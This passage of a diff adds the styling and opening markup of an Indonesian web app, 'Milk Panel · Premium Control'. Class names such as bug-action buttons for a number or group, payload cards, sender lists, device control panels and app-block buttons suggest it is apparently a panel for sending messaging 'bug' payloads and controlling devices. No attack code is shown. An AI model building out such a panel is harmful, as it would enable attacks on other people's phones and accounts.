@@ -1,0 +1,2423 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Milk Panel · Premium Control</title>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<style>
+  :root {
+    --milk:#f8f4ef; --milk-deep:#efe8df; --cream:#fffdf9;
+    --shadow:rgba(120,90,60,0.18); --accent:#c4a484; --accent-deep:#a67c52;
+    --text:#4a3b2f; --text-soft:#7a6a5a;
+    --bg1:#f5efe6; --bg2:#ebe2d6; --bg3:#e4d9cb;
+  }
+  [data-theme="dark"] {
+    --milk:#2a2420; --milk-deep:#3a322c; --cream:#1e1a17;
+    --shadow:rgba(0,0,0,0.45); --accent:#c4a484; --accent-deep:#e0c9a8;
+    --text:#f0e6da; --text-soft:#b0a090;
+    --bg1:#1a1614; --bg2:#221e1a; --bg3:#2a2420;
+  }
+  [data-theme="rose"] {
+    --milk:#fdf2f4; --milk-deep:#f8e4e8; --cream:#fff8f9;
+    --shadow:rgba(140,70,90,0.18); --accent:#d4a0b0; --accent-deep:#b87890;
+    --text:#4a3038; --text-soft:#8a6070;
+    --bg1:#f9eef1; --bg2:#f0e0e5; --bg3:#e8d4db;
+  }
+  [data-theme="purple"] {
+    --milk:#f3eafd; --milk-deep:#e4d5f7; --cream:#fbf8ff;
+    --shadow:rgba(100,60,140,0.18); --accent:#a884d4; --accent-deep:#7c52a6;
+    --text:#3b2f4a; --text-soft:#6a5a7a;
+    --bg1:#efe6f8; --bg2:#e2d6eb; --bg3:#d6c3e4;
+  }
+  [data-theme="ocean"] {
+    --milk:#eaeeef; --milk-deep:#d5e0e4; --cream:#f8fafb;
+    --shadow:rgba(60,100,120,0.18); --accent:#84b8d4; --accent-deep:#528ca6;
+    --text:#2f3e4a; --text-soft:#5a6d7a;
+    --bg1:#e6f0f5; --bg2:#d6e4eb; --bg3:#c3d8e4;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  body{
+    font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
+    background:linear-gradient(165deg,var(--bg1) 0%,var(--bg2) 40%,var(--bg3) 100%);
+    color:var(--text);min-height:100dvh;overflow:hidden;position:relative;
+    transition:background .3s,color .3s;
+  }
+  body::before,body::after{content:'';position:fixed;border-radius:50%;filter:blur(60px);opacity:.55;pointer-events:none;z-index:0}
+  body::before{width:320px;height:320px;background:#fff;top:-80px;left:-60px}
+  body::after{width:280px;height:280px;background:#f0e6d8;bottom:-40px;right:-50px}
+  .screen{position:absolute;inset:0;display:none;flex-direction:column;z-index:1}
+  .screen.active{display:flex}
+  
+  /* LOADING VERIFIKASI */
+  #loadingVerify{
+    align-items:center;justify-content:center;
+    background:radial-gradient(ellipse at 50% 40%,#1a1614 0%,#0d0b0a 100%);
+    color:#fff;
+  }
+  .verify-spinner{
+    width:70px;height:70px;border:4px solid rgba(196,164,132,0.25);
+    border-top-color:#c4a484;border-radius:50%;
+    animation:spin 0.9s linear infinite;margin-bottom:28px;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .verify-title{font-size:20px;font-weight:700;letter-spacing:1px;margin-bottom:8px}
+  .verify-status{font-size:13px;color:#b0a090;min-height:20px;transition:opacity .3s}
+  .verify-steps{margin-top:24px;font-size:12px;color:#7a6a5a;text-align:center;line-height:1.8}
+  .verify-steps span{display:block;opacity:0.4}
+  .verify-steps span.done{opacity:1;color:#c4a484}
+
+  /* MENU SELECT */
+  #menuSelect{
+    background:#000;align-items:center;justify-content:center;overflow:hidden;
+  }
+  #menuSelect video{
+    position:absolute;inset:0;width:100%;height:100%;object-fit:cover;z-index:0;
+  }
+  .menu-overlay{
+    position:absolute;inset:0;background:rgba(0,0,0,0.45);z-index:1;
+  }
+  .menu-center{
+    position:relative;z-index:2;text-align:center;flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
+  }
+  .menu-dev-text{
+    font-size:32px;font-weight:900;color:#fff;
+    text-shadow:0 2px 12px rgba(0,0,0,0.8),0 0 30px rgba(196,164,132,0.4);
+    letter-spacing:3px;margin-bottom:12px;
+  }
+  .menu-sub-text{
+    font-size:13px;color:#d0c0b0;letter-spacing:2px;font-weight:600;
+  }
+  .menu-bottom{
+    position:absolute;bottom:0;left:0;right:0;z-index:3;
+    padding:28px 20px 40px;display:flex;flex-direction:column;gap:14px;align-items:center;
+  }
+  .menu-btn{
+    width:100%;max-width:320px;padding:16px 20px;border:none;border-radius:16px;
+    font-size:15px;font-weight:700;letter-spacing:1.5px;cursor:pointer;
+    text-transform:uppercase;transition:transform .2s,box-shadow .2s;
+    box-shadow:0 8px 24px rgba(0,0,0,0.35);
+  }
+  .menu-btn:active{transform:scale(0.97)}
+  .menu-btn.sign{
+    background:linear-gradient(145deg,#c4a484,#a67c52);color:#fff;
+  }
+  .menu-btn.buy{
+    background:rgba(255,255,255,0.12);color:#fff;border:1px solid rgba(255,255,255,0.25);
+    backdrop-filter:blur(8px);
+  }
+  .menu-btn.group{
+    background:rgba(255,255,255,0.08);color:#d0c0b0;border:1px solid rgba(255,255,255,0.15);
+    backdrop-filter:blur(8px);
+  }
+
+  .skip-btn{
+    position:absolute;
+    bottom:max(24px, env(safe-area-inset-bottom, 0px) + 16px);
+    right:max(16px, env(safe-area-inset-right, 0px) + 12px);
+    background:rgba(255,255,255,0.14);
+    backdrop-filter:blur(14px);
+    -webkit-backdrop-filter:blur(14px);
+    border:1px solid rgba(255,255,255,0.32);
+    padding:11px 20px;
+    border-radius:24px;
+    font-size:13px;
+    font-weight:600;
+    color:#fff;
+    box-shadow:0 6px 22px rgba(0,0,0,0.45);
+    cursor:pointer;
+    z-index:110;
+    display:flex;
+    align-items:center;
+    gap:6px;
+    letter-spacing:0.4px;
+    transition:transform 0.15s ease, background 0.15s ease;
+  }
+  .skip-btn:active{
+    transform:scale(0.96);
+    background:rgba(255,255,255,0.22);
+  }
+
+  #videoIntro{background:#000;align-items:center;justify-content:center;z-index:100}
+  #videoIntro video{width:100%;height:100%;object-fit:cover}
+  .video-overlay-content{position:absolute;bottom:90px;left:50%;transform:translateX(-50%);text-align:center;width:100%;z-index:102;pointer-events:none}
+  .text-3d-effect{font-size:26px;font-weight:900;color:#fff;text-shadow:0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25);letter-spacing:2px;margin-bottom:12px}
+  .loading-bar-container{width:220px;height:6px;background:rgba(255,255,255,0.3);border-radius:10px;margin:0 auto;overflow:hidden;position:relative}
+  .loading-bar-fill{position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,#c4a484,#fff);animation:loadingRight 2s infinite linear}
+  @keyframes loadingRight{0%{left:-100%}100%{left:100%}}
+  .mbweh-text{font-size:14px;font-weight:700;color:#ffd700;margin-top:8px;text-shadow:0 2px 4px rgba(0,0,0,.8)}
+
+  #login{align-items:center;justify-content:center;padding:24px}
+  .card-3d{width:100%;max-width:360px;background:linear-gradient(160deg,#fff 0%,#f9f4ee 100%);border-radius:28px;padding:36px 28px 32px;box-shadow:18px 24px 50px rgba(120,90,60,.18),inset 0 1px 0 #fff}
+  .logo-mini{width:56px;height:56px;margin:0 auto 20px;background:linear-gradient(145deg,#fff,#f0e6da);border-radius:50%;box-shadow:8px 10px 20px rgba(120,90,60,.18)}
+  .card-title{text-align:center;font-size:22px;font-weight:700;margin-bottom:6px;color:#4a3b2f}
+  .card-sub{text-align:center;font-size:13px;color:#7a6a5a;margin-bottom:28px}
+  .field{margin-bottom:16px}
+  .field label{display:block;font-size:12px;font-weight:600;color:#7a6a5a;margin-bottom:6px}
+  .field input, .field select{width:100%;padding:14px 16px;border:none;border-radius:16px;background:#efe8df;color:#4a3b2f;font-size:15px;box-shadow:inset 4px 5px 12px rgba(160,130,100,.15);outline:none}
+  .custom-picker-btn{width:100%;padding:14px 16px;border:none;border-radius:16px;background:var(--milk-deep);color:var(--text);font-size:15px;text-align:left;cursor:pointer;box-shadow:inset 4px 5px 12px rgba(160,130,100,.15);display:flex;justify-content:space-between;align-items:center}
+  .btn-primary{width:100%;margin-top:12px;padding:16px;border:none;border-radius:18px;background:linear-gradient(145deg,var(--accent),var(--accent-deep));color:#fff;font-size:16px;font-weight:700;box-shadow:8px 12px 24px var(--shadow);cursor:pointer}
+  .login-error{display:none;text-align:center;color:#b85c4a;font-size:13px;margin-top:14px;word-break:break-all;}
+  #main{background:transparent}
+  .topbar{padding:18px 20px 12px;display:flex;align-items:center;justify-content:space-between}
+  .topbar h1{font-size:20px;font-weight:700}
+  .badge-premium{background:linear-gradient(145deg,var(--milk-deep),var(--accent));color:var(--text);font-size:11px;font-weight:700;padding:5px 12px;border-radius:20px;box-shadow:4px 5px 12px var(--shadow)}
+  .content{flex:1;overflow-y:auto;padding:8px 16px 100px;-webkit-overflow-scrolling:touch}
+  .fragment{display:none}
+  .fragment.active{display:block;animation:fadeIn .25s ease}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+  .section-title{font-size:15px;font-weight:700;margin:20px 4px 12px;display:flex;align-items:center;justify-content:space-between}
+  .btn-refresh{padding:6px 12px;border:none;border-radius:12px;background:var(--milk-deep);color:var(--text);font-size:12px;font-weight:600;cursor:pointer}
+  .status-row{display:flex;gap:10px;margin-bottom:8px}
+  .status-pill{flex:1;background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:18px;padding:14px 12px;box-shadow:6px 8px 18px var(--shadow);text-align:center}
+  .status-pill .num{font-size:20px;font-weight:700}
+  .status-pill .lbl{font-size:11px;color:var(--text-soft);margin-top:2px}
+  
+  .home-widget{background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:18px;padding:14px 16px;margin-bottom:12px;box-shadow:6px 8px 18px var(--shadow)}
+  .home-widget h4{font-size:13px;font-weight:700;margin-bottom:6px;color:var(--accent-deep)}
+  .home-widget p{font-size:12px;color:var(--text-soft);line-height:1.4}
+
+  /* STORY TRAY STYLING DI HOME */
+  .story-tray{display:flex;gap:12px;overflow-x:auto;scroll-snap-type:x mandatory;scrollbar-width:none;padding:4px 2px 10px}
+  .story-tray::-webkit-scrollbar{display:none}
+  .story-item{display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer;flex-shrink:0;position:relative}
+  .story-ring{width:64px;height:64px;border-radius:50%;background:linear-gradient(135deg,#3498db,#8e44ad);padding:3px;display:flex;align-items:center;justify-content:center;box-shadow:4px 6px 14px var(--shadow)}
+  .story-avatar{width:100%;height:100%;border-radius:50%;object-fit:cover;border:2px solid var(--cream);background:var(--milk-deep)}
+  .story-name{font-size:11px;font-weight:600;color:var(--text);max-width:64px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-align:center}
+  .story-delete-btn{position:absolute;top:-2px;right:-2px;background:#e74c3c;color:#fff;border:none;width:20px;height:20px;border-radius:50%;font-size:10px;font-weight:bold;cursor:pointer;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 6px rgba(0,0,0,0.3);z-index:5}
+
+  .bug-action-row{display:flex;gap:10px;margin-bottom:12px}
+  .bug-action-btn{
+    flex:1;padding:14px 10px;border:none;border-radius:16px;font-size:13px;font-weight:700;
+    cursor:pointer;box-shadow:4px 6px 14px var(--shadow);text-align:center;
+  }
+  .bug-action-btn.nomor{background:linear-gradient(145deg,#c45c4a,#a03c2a);color:#fff}
+  .bug-action-btn.grup{background:linear-gradient(145deg,#4a7c59,#2e5a3a);color:#fff}
+  .payload-swipe{display:flex;gap:12px;overflow-x:auto;scroll-snap-type:x mandatory;scrollbar-width:none;padding:6px 2px 10px}
+  .payload-swipe::-webkit-scrollbar{display:none}
+  .payload-card{
+    flex:0 0 140px;scroll-snap-align:center;border-radius:16px;overflow:hidden;
+    box-shadow:6px 8px 18px var(--shadow);cursor:pointer;border:2px solid transparent;
+    transition:transform .2s,border-color .2s;position:relative;
+  }
+  .payload-card.active{border-color:var(--accent-deep);transform:scale(1.03)}
+  .payload-img{
+    width:100%;height:90px;display:flex;align-items:center;justify-content:center;
+    font-size:13px;font-weight:800;color:#fff;letter-spacing:0.5px;text-align:center;
+  }
+  .payload-label{padding:8px 10px;background:var(--cream);font-size:11px;font-weight:600;color:var(--text);text-align:center}
+  .add-sender-btn{
+    width:100%;padding:13px;border:none;border-radius:14px;margin-top:8px;
+    background:linear-gradient(145deg,var(--accent),var(--accent-deep));color:#fff;
+    font-size:14px;font-weight:700;cursor:pointer;box-shadow:4px 6px 14px var(--shadow);
+  }
+  .sender-list{margin-top:10px;font-size:12px;color:var(--text-soft)}
+  .sender-chip{display:inline-block;background:var(--milk-deep);padding:4px 10px;border-radius:10px;margin:3px;font-size:11px}
+
+  .tiktok-profile-card{background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:24px;padding:24px 16px;margin-bottom:16px;box-shadow:8px 12px 28px var(--shadow);text-align:center;position:relative}
+  .tiktok-avatar-container{width:90px;height:90px;margin:0 auto 12px;position:relative;cursor:pointer}
+  .tiktok-avatar{width:100%;height:100%;border-radius:50%;object-fit:cover;border:3px solid var(--accent);box-shadow:6px 8px 18px var(--shadow);background:var(--milk-deep)}
+  .tiktok-avatar-badge{position:absolute;bottom:0;right:0;background:var(--accent-deep);color:#fff;width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+  .tiktok-username{font-size:18px;font-weight:800;color:var(--text);margin-bottom:2px;display:flex;align-items:center;justify-content:center;gap:6px}
+  .tiktok-handle{font-size:12px;color:var(--text-soft);margin-bottom:12px}
+  .tiktok-stats-row{display:flex;justify-content:center;gap:24px;margin-bottom:16px;padding:10px 0;border-top:1px solid var(--milk-deep);border-bottom:1px solid var(--milk-deep)}
+  .tiktok-stat-item .stat-num{font-size:15px;font-weight:700}
+  .tiktok-stat-item .stat-label{font-size:11px;color:var(--text-soft)}
+  .tiktok-bio-btn{background:linear-gradient(145deg,var(--accent),var(--accent-deep));color:#fff;border:none;padding:8px 20px;border-radius:20px;font-size:13px;font-weight:700;cursor:pointer;box-shadow:4px 6px 14px var(--shadow)}
+
+  /* GAYA CENTANG BIRU ALA TIKTOK / META AI */
+  .verified-badge-inline {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 16px;
+    height: 16px;
+    background: linear-gradient(135deg, #3498db, #2980b9);
+    color: #fff;
+    border-radius: 50%;
+    font-size: 10px;
+    font-weight: 900;
+    box-shadow: 0 0 8px rgba(52, 152, 219, 0.6);
+    flex-shrink: 0;
+    vertical-align: middle;
+  }
+
+  .tools-grid-mini{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:16px}
+  .tool-card-mini{background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:18px;padding:16px 12px;box-shadow:6px 8px 18px var(--shadow);text-align:center;cursor:pointer;border:2px solid transparent;transition:transform .2s,border-color .2s;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px}
+  .tool-card-mini:hover{border-color:var(--accent-deep);transform:translateY(-2px)}
+  .tool-card-mini.full-width{grid-column:span 2}
+  .tool-mini-icon{width:42px;height:42px;border-radius:14px;background:linear-gradient(145deg,var(--milk-deep),var(--accent));display:flex;align-items:center;justify-content:center;box-shadow:4px 5px 12px var(--shadow)}
+  .tool-mini-icon svg{width:22px;height:22px;fill:var(--text)}
+  .tool-card-mini .t-title{font-size:13px;font-weight:700;color:var(--text)}
+  .tool-card-mini .t-desc{font-size:10px;color:var(--text-soft)}
+
+  .music-item{background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:18px;padding:14px 16px;margin-bottom:10px;box-shadow:6px 8px 18px var(--shadow);display:flex;align-items:center;gap:14px}
+  .music-art{width:46px;height:46px;border-radius:14px;background:linear-gradient(145deg,var(--milk-deep),var(--accent));display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:4px 5px 12px var(--shadow)}
+  .music-art svg{width:22px;height:22px;fill:var(--text)}
+  .music-info{flex:1}
+  .music-title{font-size:14px;font-weight:700;color:var(--text);margin-bottom:2px}
+  .music-sub{font-size:11px;color:var(--text-soft)}
+  .music-play-btn{width:40px;height:40px;border-radius:50%;background:linear-gradient(145deg,var(--accent),var(--accent-deep));border:none;color:#fff;font-size:14px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:4px 6px 14px var(--shadow);flex-shrink:0}
+
+  .premium-clock-widget{background:linear-gradient(135deg,#2a2420,#4a3b2f);color:#fff;border-radius:22px;padding:18px;margin-bottom:14px;box-shadow:10px 14px 30px var(--shadow);position:relative;overflow:hidden}
+  .premium-clock-widget::before{content:'';position:absolute;top:-30px;right:-30px;width:100px;height:100px;background:rgba(196,164,132,0.2);border-radius:50%;filter:blur(20px)}
+  .clock-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+  .clock-badge{background:linear-gradient(145deg,#c4a484,#a67c52);color:#fff;font-size:10px;font-weight:800;padding:4px 10px;border-radius:12px;letter-spacing:1px}
+  .clock-date{font-size:12px;color:#d0c0b0;font-weight:600}
+  .clock-time{font-size:32px;font-weight:900;letter-spacing:1px;margin:6px 0;text-shadow:0 2px 10px rgba(0,0,0,0.3)}
+  .clock-footer{font-size:11px;color:#b0a090;display:flex;justify-content:space-between;align-items:center;border-top:1px solid rgba(255,255,255,0.1);padding-top:8px;margin-top:6px}
+  
+  .swipe-track{display:flex;gap:10px;overflow-x:auto;scroll-snap-type:x mandatory;scrollbar-width:none;padding:4px 2px}
+  .swipe-track::-webkit-scrollbar{display:none}
+  .swipe-item{flex:0 0 200px;scroll-snap-align:center;background:var(--milk-deep);border-radius:14px;padding:12px;box-shadow:4px 6px 14px var(--shadow)}
+  .swipe-item .si-title{font-size:12px;font-weight:700;margin-bottom:4px}
+  .swipe-item .si-desc{font-size:10px;color:var(--text-soft)}
+
+  .sholat-mini-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:4px;margin-top:8px;text-align:center}
+  .sholat-pill{background:var(--milk-deep);border-radius:8px;padding:6px 2px}
+  .sholat-pill .sp-name{font-size:9px;color:var(--text-soft)}
+  .sholat-pill .sp-time{font-size:11px;font-weight:700}
+
+  .list-card{background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:18px;padding:14px 16px;margin-bottom:10px;box-shadow:6px 8px 18px var(--shadow);display:flex;align-items:center;gap:12px;cursor:pointer}
+  .list-card .dot{width:10px;height:10px;border-radius:50%;background:#7bc47f;box-shadow:0 0 8px #7bc47f}
+  .list-card .dot.off{background:var(--accent);box-shadow:none}
+  .list-card .info{flex:1}
+  .list-card .name{font-size:14px;font-weight:600}
+  .list-card .meta{font-size:11px;color:var(--text-soft);margin-top:2px}
+  .list-card .arrow svg{width:16px;height:16px;fill:var(--text-soft)}
+  
+  .ctrl-header{background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:20px;padding:16px;margin-bottom:14px;box-shadow:8px 10px 22px var(--shadow);display:flex;align-items:center;gap:12px}
+  .ctrl-header .back{width:40px;height:40px;border-radius:14px;background:var(--milk-deep);border:none;display:flex;align-items:center;justify-content:center;cursor:pointer}
+  .ctrl-header .back svg{width:18px;height:18px;fill:var(--text)}
+  .ctrl-header .dev-info{flex:1}
+  .ctrl-header .dev-name{font-size:15px;font-weight:700}
+  .ctrl-header .dev-meta{font-size:11px;color:var(--text-soft);margin-top:2px}
+  .ctrl-status{display:flex;gap:8px;margin-bottom:16px}
+  .ctrl-status .pill{flex:1;text-align:center;padding:10px 6px;background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:14px;box-shadow:4px 6px 14px var(--shadow);font-size:11px}
+  .ctrl-status .pill b{display:block;font-size:14px;margin-bottom:2px}
+  .tool-box{background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:18px;padding:14px 16px;margin-bottom:10px;box-shadow:6px 8px 18px var(--shadow);display:flex;align-items:center;gap:14px}
+  .tool-box .icon-box{width:42px;height:42px;border-radius:14px;background:linear-gradient(145deg,var(--cream),var(--milk-deep));display:flex;align-items:center;justify-content:center;box-shadow:4px 5px 12px var(--shadow);flex-shrink:0}
+  .tool-box .icon-box svg{width:20px;height:20px;fill:var(--accent-deep)}
+  .tool-box .info{flex:1}
+  .tool-box .name{font-size:14px;font-weight:600}
+  .tool-box .tag{font-size:11px;color:var(--text-soft);margin-top:2px}
+  .switch-toggle{position:relative;display:inline-block;width:46px;height:26px;flex-shrink:0}
+  .switch-toggle input{opacity:0;width:0;height:0}
+  .slider{position:absolute;cursor:pointer;inset:0;background-color:var(--milk-deep);transition:.3s;border-radius:34px;box-shadow:inset 2px 2px 5px var(--shadow)}
+  .slider:before{position:absolute;content:"";height:20px;width:20px;left:3px;bottom:3px;background-color:#fff;transition:.3s;border-radius:50%;box-shadow:2px 2px 5px rgba(0,0,0,.2)}
+  input:checked + .slider{background-color:var(--accent-deep)}
+  input:checked + .slider:before{transform:translateX(20px)}
+  
+  .chat-container{display:flex;flex-direction:column;height:calc(100vh - 170px);background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:20px;padding:12px;box-shadow:8px 10px 22px var(--shadow)}
+  .chat-messages{flex:1;overflow-y:auto;padding:8px;display:flex;flex-direction:column;gap:10px}
+  .chat-bubble{max-width:85%;padding:10px 14px;border-radius:14px;font-size:13px;word-break:break-word;box-shadow:4px 4px 12px var(--shadow);display:flex;gap:8px;align-items:flex-start}
+  .chat-bubble.me{align-self:flex-end;background:var(--accent-deep);color:#fff;flex-direction:row-reverse}
+  .chat-bubble.other{align-self:flex-start;background:var(--milk-deep);color:var(--text)}
+  .chat-avatar{width:32px;height:32px;border-radius:50%;object-fit:cover;background:#ddd;flex-shrink:0;box-shadow:2px 2px 6px rgba(0,0,0,.2)}
+  .chat-content-box{flex:1}
+  .chat-bubble .sender{font-size:11px;font-weight:700;margin-bottom:2px;color:var(--accent-deep);display:flex;align-items:center;gap:4px}
+  .chat-bubble.me .sender{color:#fde3cf;text-align:right;justify-content:flex-end}
+  .chat-input-box{display:flex;gap:8px;margin-top:10px;padding-top:8px;border-top:1px solid var(--milk-deep);align-items:center}
+  .chat-input-box input{flex:1;padding:12px;border:none;border-radius:14px;background:var(--milk-deep);color:var(--text);font-size:14px;outline:none}
+  .chat-send-btn{padding:0 14px;height:42px;border:none;border-radius:14px;background:linear-gradient(145deg,var(--accent),var(--accent-deep));color:#fff;font-weight:700;cursor:pointer}
+  .chat-story-btn{width:42px;height:42px;border:none;border-radius:50%;background:linear-gradient(145deg,#3498db,#2980b9);color:#fff;font-size:18px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:4px 4px 12px var(--shadow);flex-shrink:0}
+  .chat-vn-btn{width:42px;height:42px;border:none;border-radius:50%;background:#25D366;color:#fff;font-size:18px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:4px 4px 12px var(--shadow);flex-shrink:0}
+  .chat-vn-btn.recording{background:#e74c3c;animation:pulse 1s infinite}
+  @keyframes pulse{0%{opacity:1}50%{opacity:.4}100%{opacity:1}}
+
+  .vn-player{display:flex;align-items:center;gap:10px;min-width:180px;padding:4px 0}
+  .vn-play-btn{width:32px;height:32px;border-radius:50%;border:none;background:rgba(255,255,255,0.3);color:inherit;font-size:12px;display:flex;align-items:center;justify-content:center;cursor:pointer}
+  .vn-waves{display:flex;align-items:center;gap:2px;flex:1;height:20px}
+  .vn-wave-bar{width:3px;background:currentColor;opacity:0.6;border-radius:2px;animation:waveAnim 1.2s infinite ease-in-out}
+  .vn-wave-bar:nth-child(2){animation-delay:0.2s}
+  .vn-wave-bar:nth-child(3){animation-delay:0.4s}
+  .vn-wave-bar:nth-child(4){animation-delay:0.1s}
+  .vn-wave-bar:nth-child(5){animation-delay:0.5s}
+  @keyframes waveAnim{0%,100%{height:6px}50%{height:18px}}
+
+  .theme-swipe-container{position:relative;width:100%;overflow:hidden;margin-bottom:16px;padding:4px 0}
+  .theme-swipe-track{display:flex;gap:12px;overflow-x:auto;scroll-snap-type:x mandatory;scrollbar-width:none;padding:4px 2px 12px}
+  .theme-swipe-track::-webkit-scrollbar{display:none}
+  .theme-card-swipe{flex:0 0 130px;scroll-snap-align:center;background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:18px;padding:12px;box-shadow:6px 8px 18px var(--shadow);text-align:center;cursor:pointer;border:2px solid transparent;transition:transform .2s,border-color .2s}
+  .theme-card-swipe.active{border-color:var(--accent-deep);transform:scale(1.03)}
+  .theme-img-preview{width:100%;height:80px;border-radius:12px;margin-bottom:8px;box-shadow:3px 4px 10px rgba(0,0,0,.15);background-size:cover;background-position:center}
+  .theme-card-swipe .label{font-size:12px;font-weight:600}
+  .bottom-nav{position:absolute;bottom:0;left:0;right:0;height:78px;background:linear-gradient(180deg,color-mix(in srgb,var(--cream) 92%,transparent),var(--cream));backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:space-around;padding:0 6px 10px;box-shadow:0 -8px 30px var(--shadow);border-radius:28px 28px 0 0;z-index:10}
+  .nav-item{flex:1;display:flex;flex-direction:column;align-items:center;gap:4px;background:none;border:none;color:var(--text-soft);font-size:10px;font-weight:600;cursor:pointer;padding:6px}
+  .nav-item .icon{width:38px;height:38px;border-radius:14px;display:flex;align-items:center;justify-content:center}
+  .nav-item .icon svg{width:18px;height:18px;fill:var(--text-soft)}
+  .nav-item.active .icon{background:linear-gradient(145deg,var(--milk-deep),var(--accent));box-shadow:6px 8px 16px var(--shadow)}
+  .nav-item.active .icon svg{fill:var(--text)}
+  .nav-item.active{color:var(--text)}
+  .toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%);background:var(--text);color:var(--cream);padding:10px 20px;border-radius:20px;font-size:13px;z-index:99;box-shadow:0 8px 24px rgba(0,0,0,.25)}
+  .modal-bg{display:none;position:fixed;inset:0;background:rgba(40,30,20,.55);z-index:80;align-items:center;justify-content:center;padding:20px}
+  .modal-bg.show{display:flex}
+  .modal-card{width:100%;max-width:340px;background:linear-gradient(160deg,var(--cream),var(--milk));border-radius:24px;padding:24px 20px 20px;box-shadow:0 20px 50px rgba(0,0,0,.25)}
+  .modal-card h3{font-size:17px;font-weight:700;text-align:center;margin-bottom:6px}
+  .modal-card .sub{font-size:12px;color:var(--text-soft);text-align:center;margin-bottom:18px}
+  .modal-field{margin-bottom:14px}
+  .modal-field label{display:block;font-size:12px;font-weight:600;color:var(--text-soft);margin-bottom:6px}
+  .modal-field input,.modal-field select{width:100%;padding:13px 14px;border:none;border-radius:14px;background:var(--milk-deep);color:var(--text);font-size:15px;outline:none}
+  .modal-actions{display:flex;gap:10px;margin-top:8px}
+  .modal-actions button{flex:1;padding:13px;border:none;border-radius:14px;font-size:14px;font-weight:700;cursor:pointer}
+  .btn-cancel{background:var(--milk-deep);color:var(--text)}
+  .btn-ok{background:linear-gradient(145deg,var(--accent),var(--accent-deep));color:#fff}
+  .picker-option-list{display:flex;flex-direction:column;gap:8px;max-height:240px;overflow-y:auto;margin-bottom:14px}
+  .picker-option-item{padding:12px 14px;background:var(--milk-deep);border-radius:14px;font-size:14px;font-weight:600;cursor:pointer;text-align:center;transition:background .2s,color .2s}
+  .picker-option-item:hover,.picker-option-item.selected{background:var(--accent-deep);color:#fff}
+  .preview-box{width:100%;height:220px;border-radius:16px;background:#111;display:flex;align-items:center;justify-content:center;margin-bottom:16px;overflow:hidden;position:relative}
+  .preview-box img{width:100%;height:100%;object-fit:cover}
+  .preview-placeholder{color:#888;font-size:13px;text-align:center}
+  .preview-status{position:absolute;bottom:8px;left:8px;background:rgba(0,0,0,.6);color:#fff;font-size:11px;padding:4px 10px;border-radius:10px}
+  .app-item{display:flex;align-items:center;gap:12px;padding:12px 0;border-bottom:1px solid var(--milk-deep)}
+  .app-item:last-child{border-bottom:none}
+  .app-item .app-icon{width:36px;height:36px;border-radius:10px;background:var(--milk-deep);display:flex;align-items:center;justify-content:center;font-size:16px}
+  .app-item .app-name{flex:1;font-size:14px;font-weight:600}
+  .app-item .block-btn{padding:6px 12px;border:none;border-radius:10px;font-size:12px;font-weight:700;background:linear-gradient(145deg,#e07a6a,#c45c4a);color:#fff;cursor:pointer}
+  .debug-box{background:var(--milk-deep);border-radius:12px;padding:10px 12px;font-size:11px;color:var(--text-soft);margin-top:8px;word-break:break-all}
+</style>
+</head>
+<body data-theme="milk">
+
+<!-- LOADING VERIFIKASI -->
+<div id="loadingVerify" class="screen active">
+  <div class="verify-spinner"></div>
+  <div class="verify-title">MILK PANEL</div>
+  <div class="verify-status" id="verifyStatus">Memulai verifikasi...</div>
+  <div class="verify-steps" id="verifySteps">
+    <span id="step1">Device Check</span>
+    <span id="step2">Internet Connection</span>
+    <span id="step3">User Session</span>
+    <span id="step4">Secure Channel</span>
+  </div>
+</div>
+
+<!-- MENU SELECT -->
+<div id="menuSelect" class="screen">
+  <video id="menuBgVideo" autoplay muted loop playsinline>
+    <source src="https://files.catbox.moe/e7p23d.mp4" type="video/mp4">
+  </video>
+  <div class="menu-overlay"></div>
+  <div class="menu-center">
+    <div class="menu-dev-text">DEV. MBWEH</div>
+    <div class="menu-sub-text">PREMIUM CONTROL SYSTEM</div>
+  </div>
+  <div class="menu-bottom">
+    <button class="menu-btn sign" onclick="goToLogin()">SIGN ACCOUNT</button>
